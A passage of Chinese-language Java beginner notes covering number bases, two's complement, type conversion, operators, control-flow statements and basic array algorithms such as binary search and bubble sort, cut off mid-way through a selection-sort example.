数字组成：0-9 ​ 进位规则：逢十进一 （2）二进制 ​ 数字组成：0-1 ​ 进位规则：逢二进一 （3）八进制 ​ 数字组成：0-7 ​ 进位规则：逢八进一 （4）十六进制 ​ 数字组成：0-9，af（或AF） ​ 进位规则：逢十六进一 2、请分别用四种类型的进制来表示10，并输出它的结果：（了解） （1）十进制：正常表示 System.out.println(10); （2）二进制：0b或0B开头 System.out.println(0B10); （3）八进制：0开头 System.out.println(010); （4）十六进制：0x或0X开头 System.out.println(0X10); 3、为什么byte是-128~127？（理解） 1个字节：8位 0000 0001 ~ 0111 111 ==&gt; 1~127 1000 0001 ~ 1111 1111 ==&gt; -127 ~ -1 0000 0000 ==&gt;0 1000 0000 ==&gt; -128（特殊规定） 解释：计算机数据的存储（了解） 计算机数据的存储使用二进制补码形式存储，并且最高位是符号位，1是负数，0是正数。 规定：正数的补码与反码、原码一样，称为三码合一； ​ 负数的补码与反码、原码不一样： ​ 负数的原码：把十进制转为二进制，然后最高位设置为1 ​ 负数的反码：在原码的基础上，最高位不变，其余位取反（0变1,1变0） ​ 负数的补码：反码+1 例如：byte类型（1个字节，8位） 25 ==&gt; 原码 0001 1001 ==&gt; 反码 0001 1001 –&gt;补码 0001 1001 -25 ==&gt;原码 1001 1001 ==&gt; 反码1110 0110 ==&gt;补码 1110 0111 底层是用加法代替减法：-128==》-127-1==》-127+(-1) ​ -127- -1 ==&gt; -127 + 1 4、学生疑惑解答？ （1）为什么float（4个字节）比long（8个字节）的存储范围大？ （2）为什么double（8个字节）比float（4个字节）精度范围大？ 因为float、double底层也是二进制，先把小数转为二进制，然后把二进制表示为科学记数法，然后只保存： （1）符号位（2）指数位（3）尾数位 详见《float型和double型数据的存储方式.docx》 2.3.4 基本数据类型的转换1、自动类型转换 （1）当把存储范围小的值（常量值、变量的值、表达式计算的结果值）赋值给了存储范围大的变量时， byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double ​ char-&gt; 12int i = 'A';//char自动升级为intdouble d = 10;//int自动升级为double （2）当存储范围小的数据类型与存储范围大的数据类型一起混合运算时，会按照其中最大的类型运算 12345int i = 1;byte b = 1;double d = 1.0;double sum = i + b + d;//混合运算，升级为double （3）当byte,short,char数据类型进行算术运算时，按照int类型处理 1234567byte b1 = 1;byte b2 = 2;byte b3 = (byte)(b1 + b2);//b1 + b2自动升级为intchar c1 = '0';char c2 = 'A';System.out.println(c1 + c2);//113 （4）boolean类型不参与 2、强制类型转换 （1）当把存储范围大的值（常量值、变量的值、表达式计算的结果值）赋值给了存储范围小的变量时，需要强制类型转换 double-&gt;float-&gt;long-&gt;int-&gt;short-&gt;byte ​ -&gt;char 提示：有风险，可能会损失精度或溢出 12345double d = 1.2;int num = (int)d;//损失精度int i = 200;byte b = (byte)i;//溢出 （2）boolean类型不参与 （3）当某个值想要提升数据类型时，也可以使用强制类型转换 123int i = 1;int j = 2;double shang = (double)i/j; 提示：这个情况的强制类型转换是没有风险的。 2.3.5 特殊的数据类型转换1、任意数据类型的数据与String类型进行“+”运算时，结果一定是String类型 1System.out.println(\"\" + 1 + 2);//12 2、但是String类型不能通过强制类型()转换，转为其他的类型 12String str = \"123\";int num = (int)str;//错误的 2.4 运算符1、按照操作数个数的分类： （1）一元运算符：操作数只有一个 例如：正号（+），负号（-），自增（++），自减（–），逻辑非（！），按位取反（~） （2）二元运算符：操作数有两个 例如：加（+），减（-），乘（*），除（/），模（%） ​ 大于（&gt;），小于（&lt;），大于等于（&gt;=），小于等于（&lt;=），等于（==），不等于（!=） ​ 赋值（=，+=，-=，*=，/=，%=，&gt;&gt;=，&lt;&lt;=。。。） ​ 逻辑与（&amp;），逻辑或（|），逻辑异或（^），短路与（&amp;&amp;），短路或（||） ​ 左移（&lt;&lt;），右移（&gt;&gt;），无符号右移（&gt;&gt;&gt;），按位与（&amp;），按位或（|），按位异或（^） （3）三元运算符：操作数三个 例如： ？ ： 2、Java基本数据类型的运算符： （1）算术运算符 （2）赋值运算符 （3）比较运算符 （4）逻辑运算符 （5）条件运算符 （6）位运算符（难） 2.4.1 算术运算符加法：+ 减法：- 乘法：* 除法：/ 注意：整数与整数相除，只保留整数部分 取模：% 取余 注意：取模结果的正负号只看被模数 正号：+ 负号：- 自增：++ 自减：– 原则：自增与自减 ++/–在前的，就先自增/自减，后取值 ++/–在后的，就先取值，后自增/自减 整个表达式的扫描，是从左往右扫描，如果后面的先计算的，那么前面的就暂时先放到“操作数栈”中 代码示例： 1234567891011121314151617181920212223242526272829303132int i = 1;i++;//i=2int j = 1;++j;//j=2int a = 1;int b = a++;//(1)先取a的值“1”放操作数栈(2)a再自增,a=2(3)再把操作数栈中的\"1\"赋值给b,b=1int m = 1;int n = ++m;//(1)m先自增,m=2(2)再取m的值“2”放操作数栈(3)再把操作数栈中的\"2\"赋值给n,n=1int i = 1;int j = i++ + ++i * i++;/*从左往右加载(1)先算i++①取i的值“1”放操作数栈②i再自增 i=2（2）再算++i①i先自增 i=3②再取i的值“3”放操作数栈（3）再算i++①取i的值“3”放操作数栈②i再自增 i=4（4）先算乘法用操作数栈中3 * 3 = 9，并把9压会操作数栈（5）再算求和用操作数栈中的 1 + 9 = 10（6）最后算赋值j = 10*/ 2.4.2 赋值运算符基本赋值运算符：= 扩展赋值运算符：+=，-=，*=，/=，%=… 注意：所有的赋值运算符的=左边一定是一个变量 扩展赋值运算符=右边的计算结果的类型如果比左边的大的话会强制类型转换，所以结果可能有风险。 扩展赋值运算符的计算：（1）赋值最后算（2）加载数据的顺序是把左边的变量的值先加载，再去与右边的表达式进行计算 123456789101112131415161718int i = 1;int j = 5;j *= i++ + j++;//j = j *(i++ + j++);/*(1)先加载j的值“5”(2)在计算i++①先加载i的值“1”②再i自增，i=2(3)再计算j++①先加载j的值\"5\"②再j自增，j=6(4)算 加法i + 5 = 6(5)算乘法5 * 6 = 30(6)赋值j = 30*/ 2.4.3 比较运算符大于：&gt; 小于：&lt; 大于等于：&gt;= 小于等于：&lt;= 等于：== 注意区分赋值运算符的= 不等于：!= 注意：比较表达式的运算结果一定只有true/false 比较表达式可以作为（1）条件（2）逻辑运算符的操作数 2.4.4 逻辑运算符 逻辑运算符的操作数必须是布尔值，结果也是布尔值 逻辑与：&amp; 运算规则：只有左右两边都为true，结果才为true。 例如：true &amp; true 结果为true false &amp; true 结果为false true &amp; false 结果为false false &amp; false 结果为false逻辑或：| 运算规则：只要左右两边有一个为true，结果就为true。 例如：true | true 结果为true false | true 结果为true true | false 结果为true false | false 结果为false逻辑异或：^ 运算规则：只有左右两边不同，结果才为true。 例如：true ^ true 结果为false false ^ true 结果为true true ^ false 结果为true false ^ false 结果为false 逻辑非：! 运算规则：布尔值取反 例如：!true 为false !false 为true 短路与：&amp;&amp; 运算规则：只有左右两边都为true，结果才为true。 例如：true &amp; true 结果为true true &amp; false 结果为false false &amp; ? 结果就为false 它和逻辑与不同的是当&amp;&amp;左边为false时，右边就不看了。 短路或：|| 运算规则：只要左右两边有一个为true，结果就为true。 例如：true | ? 结果为treu false | true 结果为true false | false 结果为false 它和逻辑或不同的是当||左边为true时，右边就不看了。 开发中一般用短路与和短路或比较多 面试题：&amp;&amp; 和 &amp;的区别？ &amp;&amp;当左边为false，右边不计算 &amp;不管左边是true还是false，右边都要计算 2.4.5 条件运算符 ? : 语法格式： 1条件表达式 ? 结果表达式1 : 结果表达式2 运算规则： 整个表达式的结果：当条件表达式为true时，就取结果表达式1的值，否则就取结果表达式2的值 代码示例： 123456789（1）boolean类型boolean marry = true;System.out.println(marry? \"已婚\" : \"未婚\");（2）求最值int i = 3;int j = 5;int max = i&gt;=j ? i : j;//当i&gt;=j时，max就赋值为i的值，否则就赋值为j的值 2.4.6 位运算符左移：&lt;&lt; ​ 运算规则：左移几位就相当于乘以2的几次方 右移：&gt;&gt; ​ 运算规则：右移几位就相当于除以2的几次方 无符号右移：&gt;&gt;&gt; ​ 运算规则：往右移动后，左边空出来的位直接补0，不看符号位 按位与：&amp; ​ 运算规则： ​ 1 &amp; 1 结果为1 ​ 1 &amp; 0 结果为0 ​ 0 &amp; 1 结果为0 ​ 0 &amp; 0 结果为0 按位或：| ​ 运算规则： ​ 1 | 1 结果为1 ​ 1 | 0 结果为1 ​ 0 | 1 结果为1 ​ 0 &amp; 0 结果为0 按位异或：^ ​ 运算规则： ​ 1 ^ 1 结果为0 ​ 1 ^ 0 结果为1 ​ 0 ^ 1 结果为1 ​ 0 ^ 0 结果为0 按位取反：~ ​ 运算规则：~0就是1 ​ ~1就是0 如何区分&amp;,|,^是逻辑运算符还是位运算符？ 如果操作数是boolean类型，就是逻辑运算符，如果操作数是整数，那么就位运算符。 2.4.7 运算符优先级 1553858424335 提示说明： （1）表达式不要太复杂 （2）先算的使用() 2.4.8 运算符操作数类型说明1、算术运算符 数字和单个字符可以使用算术运算符。 其中+，当用于字符串时，表示拼接。 2、赋值运算符 右边的常量值、表达式的值、变量的值的类型必须与左边的变量一致或兼容（可以实现自动类型转换）或使用强制类型转换可以成功。 3、比较运算符 其他的比较运算符都是只能用于8种基本数据类型。 其中的==和!=可以用于引用数据类型的比较，用于比较对象的地址。（后面讲） 1234567int i = 10;int j = 10;System.out.println(i==j);//truechar c1 = '帅';char c2 = '帅';System.out.println(c1 == c2);//true 4、逻辑运算符 逻辑运算符的操作数必须是boolean值 5、条件运算符 ?前面必须是条件，必须是boolean值 结果表达式1和结果表达式2要保持类型一致或兼容 6、位运算符 一般用于整数系列 以上运算符都是针对基本数据类型设计的。 能够用于引用数据类型只有基本的赋值运算符=，和比较运算符中的==和!=。其他运算符都不能用于引用数据类型。 其中字符串类型还有一个+，表示拼接。 第三章 流程控制语句结构流程控制语句结构分为： 1、顺序结构：从上到下依次执行 2、分支结构：多个分支选择其中一个分支执行 3、循环结构：重复执行某些代码 3.1 顺序结构执行过程：从上到下顺序执行 3.1.1 输出语句1、System.out.print(输出内容); #输出内容后不换行 2、System.out.println(输出内容); #输出内容后换行 12345678910111213141516171819202122232425#输出常量System.out.print(1);System.out.print('尚');System.out.print(44.4);System.out.print(true);System.out.print(\"尚硅谷\");#输出变量int a = 1;char c = '尚';double d = 44.4;boolean b = true;String school = \"尚硅谷\";System.out.print(a);System.out.print(c);System.out.print(d);System.out.print(b);System.out.print(school);#输出拼接结果System.out.print(\"a = \" + a);System.out.print(\"c = \" + c);System.out.print(\"d = \" + d);System.out.print(\"b = \" + b);System.out.print(\"school = \" + school); 3.1.2 输入语句键盘输入代码的三个步骤： 1、准备Scanner类型的变量 2、提示输入xx 3、接收输入内容 示例代码： 12345678910111213141516//1、准备Scanner类型的变量java.util.Scanner input = new java.util.Scanner(System.in);//System.in默认代表键盘输入//2、提示输入xxSystem.out.print(\"请输入一个整数：\");//3、接收输入内容int num = input.nextInt();//列出各种数据类型的输入int num = input.nextInt();long bigNum = input.nextLong();double d = input.nextDouble();boolean b = input.nextBoolean();String s = input.next();char c = input.next().charAt(0);//先按照字符串接收，然后再取字符串的第一个字符（下标为0） 3.2 分支结构分支结构：根据条件选择性的执行某些代码 分为： 1、条件判断：if…else系列 2、选择结构：switch…case系列 3.2.1 条件判断1、单分支结构语法格式： 123if(条件表达式)&#123; 当条件表达式成立(true)时需要执行的语句块;&#125; 执行过程： ​ 条件成立，就执行{}其中的语句块，不成立就不执行。 注意： （1）if(条件表达式)中的条件表达式的结果必须是boolean类型 （2）当{}中的语句只有一个语句（简单的语句，也可以是一个复合语句）时，可以省略{}，但是我们不建议省略 1234567891011121314//省略&#123;&#125;的情况if(score&lt;0 || score&gt;100) System.out.println(\"输入有误！\");//简单的语句else //复合语句 if(score==100)&#123; System.out.println(\"满分\"); &#125;else if(score&gt;=80)&#123; System.out.println(\"优秀\"); &#125;else if(score&gt;=60)&#123; System.out.println(\"及格\"); &#125;else&#123; System.out.println(\"不及格\"); &#125; 示例代码： 12345int year = 2019;int days = 28;if(year%4==0 &amp;&amp; year%100!=0 || year%400==0)&#123; days= 29;&#125; 2、双分支结构语法格式： 12345if(条件表达式)&#123; 当条件表达式成立(true)时需要执行的语句块1;&#125;else&#123; 当条件表达式不成立(false)时需要执行的语句块2;&#125; 执行过程： ​ 当条件表达式成立(true)时执行语句块1，否则执行语句块2 注意： （1）if(条件表达式)中的条件表达式的结果必须是boolean类型 （2）当{}中的语句只有一个语句（简单的语句，也可以是一个复合语句）时，可以省略{}，但是我们不建议 示例代码： 123456int num = 10;if(num%2==0)&#123; System.out.println(num + \"是偶数\")；&#125;else&#123; System.out.println(num + \"是奇数\")；&#125; 3、多分支结构语法格式： 1234567891011121314if(条件表达式1)&#123; 当条件表达式1成立的时候，执行的语句块1；&#125;else if(条件表达式2)&#123; 当条件表达式1不成立， 条件表达式2成立的时候，执行的语句块2；&#125;else if(条件表达式3)&#123; 当条件表达式1不成立， 条件表达式2也不成立， 条件表达式3成立的时候，执行的语句块3；&#125;。。。【else&#123; 当以上所有的条件表达式都不成立，需要执行的语句块n+1;&#125;】 执行过程： （1）多个条件顺序往下判断，如果上面有一个条件成立了，下面的条件就不看了 （2）多个分支也只会执行其中的一个 注意： （1）每一个条件表达式都必须是boolean值 （2）当{}中只有一个语句时，也可以省略{}，但不建议省略 （3）当多个条件是“互斥”关系（没有重叠部分），顺序可以随意； ​ 当多个条件是“包含”关系（有重叠部分），顺序不能随意，小的在上，大的在下面 示例代码： 12345678910int score = 78;if(score==100)&#123; System.out.println(\"满分\");&#125;else if(score&gt;=80)&#123; System.out.println(\"优秀\");&#125;else if(score&gt;=60)&#123; System.out.println(\"及格\");&#125;else&#123; System.out.println(\"不及格\");&#125; 4、嵌套执行过程： ​ 当嵌套在if中，就是当外面的if成立时，才会看里面的条件判断； ​ 当嵌套在else中，就当外面的else满足时，才会看里面的条件判断； 3.2.2 选择结构语法格式： 12345678910111213switch(表达式)&#123; case 常量值1: 语句块1; 【break;】 case 常量值2: 语句块2; 【break;】 。。。 【default: 语句块n+1; 【break;】 】&#125; 执行过程： （1）入口 ①当switch(表达式)的值与case后面的某个常量值匹配，就从这个case进入； ②当switch(表达式)的值与case后面的所有常量值都不匹配，寻找default分支进入; （2）一旦从“入口”进入switch，就会顺序往下执行，直到遇到“出口” （3）出口 ①自然出口：遇到了switch的结束} ②中断出口：遇到了break等 注意： （1）switch(表达式)的值的类型，只能是：4种基本数据类型（byte,short,int,char），两种引用数据类型（枚举、String） （2）case后面必须是常量值，而且不能重复 示例代码： 12345678910111213141516171819202122232425int month = 4;switch(month)&#123; case 3: case 4: case 5: System.out.println(\"春季\"); break; case 6: case 7: case 8: System.out.println(\"夏季\"); break; case 9: case 10: case 11: System.out.println(\"秋季\"); break; case 12: case 1: case 2: System.out.println(\"冬季\"); break; default: System.out.println(\"输入有误！\");&#125; 3.3 循环结构循环结构： ​ “重复”执行某些代码 循环结构的分类： 1、for循环 2、while循环 3、do…while循环 3.3.1 for循环语法格式： 123456789for(;;)&#123; 循环体语句块； if(条件表达式)&#123; break; &#125;&#125;for(初始化表达式; 循环条件; 迭代表达式)&#123; 循环体语句块；（需要重复执行的代码）&#125; 执行过程： （1）初始化表达式; （2）判断循环条件; （3）如果循环条件成立，先执行循环体语句块；然后执行迭代表达式，再回到（2）… （4）如果循环条件不成立，会结束for； ​ 或者在当前循环中遇到break语句，也会结束当前for循环; 注意： （1）for(;;)中的两个；是不能多也不能少 （2）循环条件必须是boolean类型 示例代码： 1234567891011//遍历1-100之间的偶数for(int i=1; i&lt;=100; i++)&#123;//每次循环的步幅是1 if(i%2==0)&#123; System.out.println(i); &#125;&#125;//遍历1-100之间的偶数for(int i=2; i&lt;=100; i+=2)&#123;//每次循环的步幅是2 System.out.println(i);&#125; 3.3.2 while循环语法格式： 1234567891011while(循环条件)&#123; 循环体语句块;&#125;经典的形式：while(true)&#123; 循环体语句块; if(条件表达式)&#123; break; &#125;&#125; 执行过程： （1）先判断循环条件 （2）如果循环条件成立，就执行循环体语句块；然后回到（1） （3）如果循环条件不成立，就结束while循环； ​ 如果在循环体语句块中，遇到break，也会结束while循环； 注意： （1）while(循环条件)中循环条件必须是boolean类型 示例代码： 123456//遍历1-100之间的偶数int num = 2;while(num&lt;=100)&#123; System.out.println(num); num+=2;&#125; 3.3.3 do…while循环语法格式： 123do&#123; 循环体语句块;&#125;while(循环条件); 执行过程： （1）先执行一次循环体语句块； （2）判断循环条件 （3）如果循环条件成立，再次执行循环体语句块；然后回到（2）… （4）如果循环条件不成立，就结束do…while循环； ​ 如果在循环体语句块中，遇到break，也会结束do…while循环； 注意： （1）while(循环条件)中循环条件必须是boolean类型 （2）do{}while();最后有一个分号 （3）do…while结构的循环体语句是至少会执行一次，这个和for和while是不一样的 示例代码： 12345678910111213141516171819//从键盘输入整数，统计正数、负数的个数，输入0结束java.util.Scanner input = new java.util.Scanner(System.in);int num;int positive = 0;int negative = 0;do&#123; System.out.print(\"请输入整数（0结束）：\"); num = input.nextInt(); if(num &gt; 0)&#123; positive++; &#125;else if(num &lt; 0)&#123; negatvie++; &#125;&#125;while(num!=0);System.out.println(\"正数的个数：\" + positive);System.out.println(\"负数的个数：\" + negatvie); 3.3.4 三种循环的选择原则：三种循环之间是可以互相转换的，都能实现循环的功能 建议（习惯上）：当我们次数比较明显的时候，或者说从几循环到几的时候，一般先考虑for； ​ 当循环体语句块至少要执行一次的时候，一般先考虑do…while； ​ 当循环条件比较明显，但是次数不明显，循环体语句块也不是至少执行一次，那么可以考虑while结构； 三种循环结构都具有四要素： （1）循环变量的初始化表达式 （2）循环条件 （3）循环变量的修改的迭代表达式 （4）循环体语句块 3.3.5 跳转语句1、break 用于： （1）switch结构 作用：结束switch结构 （2）循环结构 作用：结束当前循环 2、continue 用于： 只能用于循环结构 作用：提前结束本次循环，继续下一次循环 3、return（后面讲） 第四章 数组4.1 数组的相关概念和名词（了解）1、数组(array)： ​ 一组具有相同数据类型的数据的按照一定顺序排列的集合。 ​ 把有限的几个相同类型的变量使用一个名称来进行统一管理。 2、数组名： ​ （1）这个数组名，代表的是一组数 ​ （2）这个数组名中存储的整个数组的“首地址” 3、下标(index)： ​ 我们使用编号、索引、下标来区别表示一组数当中某一个。 ​ 范围：[0,数组长度-1] ​ 例如：for(int i = 0; i&lt;arr.length; i++){} 4、元素(element)： ​ 这一组中的的每一个数据都是元素。 ​ 如何表示数组元素？ 数组名[下标] 5、数组的长度(length) ​ 数组中元素的总个数。 ​ 如何获取数组长度？ 数组名.length 注意：名称是为了沟通的方便，概念不用一字不落背下来 4.2 数组的相关语法4.2.1 数组的声明语法格式： 12345 //推荐元素的数据类型[] 数组名; //也对，但是不推荐元素的数据类型 数组名[]; 示例： 12345678//要存储一组整数int[] array;//要存储一组单字符char[] array;//要存储一组字符串String[] array; 4.2.2 数组的初始化初始化的目的：（1）确定数组的长度（2）为元素赋值 两种初始化方式： 1、动态初始化 语法格式： 12345678910//指定数组长度数组名 = new 元素的数据类型[长度];//为元素赋值数组名[下标] = 值; //这个值可以是个常量值，也可以是个表达式的计算结果，也可以是键盘输入的//如果每个元素的赋值比较有规律，通常使用for循环赋值for(int i=0; i&lt;长度; i++)&#123; 数组名[下标] = 值;&#125; 问：如果只指定数组长度，没有为元素手动赋值，那么元素有值吗？ 有默认值 （1）基本数据类型 ​ byte,short,int,long：0 ​ float,double：0.0 ​ char：\\u0000 ​ boolean：false （2）引用数据类型 ​ 统统都是null 2、静态初始化 语法格式： 1234567数组名 = new 元素的数据类型[]&#123;值列表&#125;;//int[] arr = new int[5]&#123;1,2,3,4,5&#125;;//错误的//更简洁//当声明与静态初始化一起完成时，可以简化元素的数据类型[] 数组名 = &#123;值列表&#125;; 适用场合： ​ 当数组的元素是已知的有限个时，可以使用静态初始化。 示例代码： 12345String[] weeks = &#123;\"monday\",\"tuesday\",\"wednesday\",\"thursday\",\"friday\",\"saturday\",\"sunday\"&#125;;int[] daysOfMonths = &#123;31,28,31,30,31,30,31,31,30,31,30,31&#125;;char[] letters = &#123;'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'&#125;; 4.2.3 数组的遍历for循环遍历数组： 1234567891011for(int i=0; i&lt;数组名.lenght; i++)&#123; //或赋值 数组名[i] = 值; //或显示 System.out.println(数组名[i])； //或其他操作 //例如：判断是否是偶数 if(数组名[i]%2==0)&#123; //... &#125;&#125; 4.2.4 数组的内存分析元素是基本数据类型的一维数组内存分析： 1int[] arr = &#123;1,2,3,4,5&#125;; 1558400311779 1234int[] arr = new int[5];for(int i=0; i&lt;arr.length; i++)&#123; arr[i] = i+1;&#125; 1558400323314 4.3 数组的相关算法4.3.1 数组找最值1、数组中找最值 思路： （1）先假设第一个元素最大/最小 （2）然后用max/min与后面的元素一一比较 示例代码： 12345678int[] arr = &#123;4,5,6,1,9&#125;;//找最大值int max = arr[0];for(int i=1; i&lt;arr.length; i++)&#123; if(arr[i] &gt; max)&#123; max = arr[i]; &#125;&#125; 2、数组中找最值及其下标 情况一：找最值及其第一次出现的下标 思路： （1）先假设第一个元素最大/最小 （2）然后用max/min与后面的元素一一比较 示例代码： 12345678910int[] arr = &#123;4,5,6,1,9&#125;;//找最大值int max = arr[0];int index = 0;for(int i=1; i&lt;arr.length; i++)&#123; if(arr[i] &gt; max)&#123; max = arr[i]; index = i; &#125;&#125; 或 123456789int[] arr = &#123;4,5,6,1,9&#125;;//找最大值int maxIndex = 0;for(int i=1; i&lt;arr.length; i++)&#123; if(arr[i] &gt; arr[maxIndex])&#123; maxIndex = i; &#125;&#125;System.out.println(\"最大值：\" + arr[maxIndex]); 情况二：找最值及其所有最值的下标（即可能最大值重复） 思路： （1）先找最大值 ①假设第一个元素最大 ②用max与后面的元素一一比较 （2）遍历数组，看哪些元素和最大值是一样的 示例代码： 123456789101112131415int[] arr = &#123;4,5,6,1,9&#125;;//找最大值int max = arr[0];for(int i=1; i&lt;arr.length; i++)&#123; if(arr[i] &gt; max)&#123; max = arr[i]; &#125;&#125;//遍历数组，看哪些元素和最大值是一样的for(int i=0; i&lt;arr.length; i++)&#123; if(max == arr[i])&#123; System.out.print(i+\"\\t\"); &#125;&#125; 4.3.2 数组统计：求总和、均值、统计偶数个数等思路：遍历数组，挨个的累加，判断每一个元素 示例代码： 1234567int[] arr = &#123;4,5,6,1,9&#125;;//求总和、均值int sum = 0;//因为0加上任何数都不影响结果for(int i=0; i&lt;arr.length; i++)&#123; sum += arr[i];&#125;double avg = (double)sum/arr.length; 示例代码2： 1234567int[] arr = &#123;4,5,6,1,9&#125;;//求总乘积long result = 1;//因为1乘以任何数都不影响结果for(int i=0; i&lt;arr.length; i++)&#123; result *= arr[i];&#125; 示例代码3： 12345678int[] arr = &#123;4,5,6,1,9&#125;;//统计偶数个数int even = 0;for(int i=0; i&lt;arr.length; i++)&#123; if(arr[i]%2==0)&#123; even++; &#125;&#125; 4.3.3 反转方法有两种： 1、借助一个新数组 2、首尾对应位置交换 第一种方式示例代码： 123456789101112131415161718int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;//(1)先创建一个新数组int[] newArr = new int[arr.length];//(2)复制元素int len = arr.length;for(int i=0; i&lt;newArr.length; i++)&#123; newArr[i] = arr[len -1 - i];&#125;//(3)舍弃旧的，让arr指向新数组arr = newArr;//这里把新数组的首地址赋值给了arr//(4)遍历显示for(int i=0; i&lt;arr.length; i++)&#123; System.out.println(arr[i]);&#125; 第二种方式示例代码： 123456789101112131415int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;//(1)计算要交换的次数： 次数 = arr.length/2//(2)首尾交换for(int i=0; i&lt;arr.length/2; i++)&#123;//循环的次数就是交换的次数 //首 与 尾交换 int temp = arr[i]; arr[i] = arr[arr.length-1-i]; arr[arr.length-1-i] = temp;&#125;//（3）遍历显示for(int i=0; i&lt;arr.length; i++)&#123; System.out.println(arr[i]);&#125; 4.3.4 复制应用场景： 1、扩容 2、备份 3、截取 示例代码：扩容 12345678910111213141516171819202122int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;//如果要把arr数组扩容，增加1个位置//(1)先创建一个新数组，它的长度 = 旧数组的长度+1int[] newArr = new int[arr.length + 1];//(2)复制元素//注意：i&lt;arr.length 因位arr比newArr短，避免下标越界for(int i=0; i&lt;arr.length; i++)&#123; newArr[i] = arr[i];&#125;//(3)把新元素添加到newArr的最后newArr[newArr.length-1] = 新值;//(4)如果下面继续使用arr，可以让arr指向新数组arr = newArr;//(4)遍历显示for(int i=0; i&lt;arr.length; i++)&#123; System.out.println(arr[i]);&#125; 示例代码：备份 1234567891011121314int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;//1、创建一个长度和原来的数组一样的新数组int[] newArr = new int[arr.length];//2、复制元素for(int i=0; i&lt;arr.length; i++)&#123; newArr[i] = arr[i];&#125;//3、遍历显示for(int i=0; i&lt;arr.length; i++)&#123; System.out.println(arr[i]);&#125; 示例代码：截取 1234567891011121314151617int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;int start = 2;int end = 5;//1、创建一个新数组，新数组的长度 = end-start + 1;int[] newArr = new int[end-start+1];//2、赋值元素for(int i=0; i&lt;newArr.length; i++)&#123; newArr[i] = arr[start + i];&#125;//3、遍历显示for(int i=0; i&lt;newArr.length; i++)&#123; System.out.println(newArr[i]);&#125; 4.3.5 查找查找分为两种： 1、顺序查找：挨个看 ​ 对数组没要求 2、二分查找：对折对折再对折 ​ 对数组有要求，元素必须有大小顺序的 顺序查找示例代码： 12345678910111213141516int[] arr = &#123;4,5,6,1,9&#125;;int value = 1;int index = -1;for(int i=0; i&lt;arr.length; i++)&#123; if(arr[i] == value)&#123; index = i; break; &#125;&#125;if(index==-1)&#123; System.out.println(value + \"不存在\");&#125;else&#123; System.out.println(value + \"的下标是\" + index);&#125; 二分查找示例代码： 12345678910111213141516171819202122232425262728293031323334353637/*2、编写代码，使用二分查找法在数组中查找 int value = 2;是否存在，如果存在显示下标，不存在显示不存在。已知数组：int[] arr = &#123;1,2,3,4,5,6,7,8,9,10&#125;;*/class Exam2&#123; public static void main(String[] args)&#123; int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;//数组是有序的 int value = 2; int index = -1; int left = 0; int right = arr.length - 1; int mid = (left + right)/2; while(left&lt;=right)&#123; //找到结束 if(value == arr[mid])&#123; index = mid; break; &#125;//没找到 else if(value &gt; arr[mid])&#123;//往右继续查找 //移动左边界，使得mid往右移动 left = mid + 1; &#125;else if(value &lt; arr[mid])&#123;//往左边继续查找 right = mid - 1; &#125; mid = (left + right)/2; &#125; if(index==-1)&#123; System.out.println(value + \"不存在\"); &#125;else&#123; System.out.println(value + \"的下标是\" + index); &#125; &#125;&#125; 使用for 12345678910111213141516171819202122232425262728293031class Exam2&#123; public static void main(String[] args)&#123; int[] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;//数组是有序的 int value = 2; int index = -1; for(int left=0,right=arr.length-1,mid = (left+right)/2; left&lt;=right; mid = (left + right)/2)&#123; //找到结束 if(value == arr[mid])&#123; index = mid; break; &#125;//没找到 else if(value &gt; arr[mid])&#123;//往右继续查找 //移动左边界，使得mid往右移动 left = mid + 1; &#125;else if(value &lt; arr[mid])&#123;//往左边继续查找 right = mid - 1; &#125; &#125; if(index==-1)&#123; System.out.println(value + \"不存在\"); &#125;else&#123; System.out.println(value + \"的下标是\" + index); &#125; &#125;&#125; 4.3.6 排序数组的排序算法有千万种，我们只讲了两种： 1、冒泡排序 2、简单的直接排序 示例代码：冒泡：从小到大，从左到右两两比较 12345678910111213141516171819int[] arr = &#123;5,4,6,3,1&#125;;for(int i=1; i&lt;arr.length; i++)&#123;//外循环的次数 = 轮数 = 数组的长度-1 /* 第1轮，i=1,从左到右两两比较，arr[0]与arr[1]。。。。。arr[3]与arr[4] 第2轮，i=2,从左到右两两比较，arr[0]与arr[1]。。。。。arr[2]与arr[3] ... arr[j]与arr[j+1]比较 找两个关键点：（1）j的起始值：0（2）找j的终止值，依次是3,2,1,0，得出j&lt;arr.length-i */ for(int j=0; j&lt;arr.length-i; j++)&#123; //两两比较 //从小到大，说明前面的比后面的大，就交换 if(arr[j] &gt; arr[j+1])&#123; int temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; &#125; &#125;&#125; 示例代码：从大到小，从右到左 12345678910111213141516171819char[] arr = &#123;'h','e','l','l','o','j','a','v','a'&#125;;for(int i=1; i&lt;arr.length; i++)&#123;//外循环的次数 = 轮数 = 数组的长度-1 /* 第1轮，i=1，从右到左两两比较，arr[8]与arr[7]，arr[7]与arr[6]....arr[1]与arr[0] 第2轮，i=2，从右到左两两比较，arr[8]与arr[7]，arr[7]与arr[6]....arr[2]与arr[1] ... 第8轮，i=8，从右到左两两比较，arr[8]与arr[7] arr[j]与arr[j-1] 找两个关键点：（1）j的起始值：8（2）找j的终止值，依次是1,2,3,。。。8，得出j&gt;=i */ for(int j=8; j&gt;=i; j--)&#123; //从大到小，后面的元素 &gt; 前面的元素，就交换 if(arr[j]&gt;arr[j-1])&#123; int temp = arr[j]; arr[j] = arr[j-1]; arr[j-1] = temp; &#125; &#125;&#125; 示例代码：简单的直接选择排序 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int[] arr = &#123;3,2,6,1,8&#125;;for(int i=1; i&lt;arr.length; i++)&#123;//外循环的次数 = 轮数 = 数组的长度-1 //（1）找出本轮未排序元素中的最值 /* 未排序元素： 第1轮：i=1,未排序，[0,4] 第2轮：i=2,未排序，[1,4] ... 每一轮未排序元素的起始下标：0,1,2,3，正好是i-1的 未排序的后面的元素依次： 第1轮：[1,4] j=1,2,3,4 第2轮：[2,4] j=2,3,4 第3轮：[3,4] j=3,4 第4轮：[4,4] j=4 j的起点是i，终点都是4 */ int max = arr[i-1]; int index = i-1; 